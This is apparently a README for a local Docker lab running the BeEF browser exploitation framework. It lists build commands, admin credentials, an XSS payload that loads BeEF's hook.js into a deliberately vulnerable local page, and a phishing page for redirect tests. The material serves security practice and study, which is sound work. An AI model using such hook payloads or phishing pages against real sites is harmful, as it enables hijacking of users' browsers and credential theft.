# beef playground  
## build docker  
docker build -t beef-playground .  
docker run -it -p 80:80 -p 3000:3000 beef-playground  
  
## beef server launched with  
admin web page: http://localhost:3000/ui/panel  
    user: beef  
    passwd: mybeefpasswd  
hook script: http://localhost:3000/hook.js  
  
## example pages accessible at:  
### Website with XSS vuln:  
XSS URL: http://localhost/xss-minimal.php  
input: <script src=http://localhost:3000/hook.js></script>  
or in URL: http://localhost/xss-minimal.php?name=<script src=http://localhost:3000/hook.js></script>  
  
### Phishing page for redirect test:  
phishing page: http://localhost/examples/github.html  
Module: Redirect iframe or standard  
  
## debug  
inspect docker container:  
docker run -it --entrypoint /bin/bash beef-playground  
in case any ruby gem installations are running an error, the solution is manual install.  
e.g. gem install xmlrpc  
  
## More  
### One creating modules  
https://github.com/beefproject/beef/wiki/Module-creation  
### Usage with Metasploit  
https://github.com/beefproject/beef/wiki/Configuration#metasploit  
